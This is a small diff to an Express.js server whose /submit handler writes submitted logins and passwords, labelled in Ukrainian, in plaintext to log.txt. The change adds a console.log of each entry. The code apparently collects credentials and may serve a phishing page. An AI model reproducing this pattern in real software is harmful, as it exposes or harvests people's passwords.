@@ -11,7 +11,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.post('/submit', (req, res) => {
   const { login, password } = req.body;
   const entry = `${new Date().toISOString()} | Логін: ${login} | Пароль: ${password}\n`;
-
+console.log(entry);
   fs.appendFile('log.txt', entry, err => {
     if (err) {
       console.error('Помилка запису:', err);
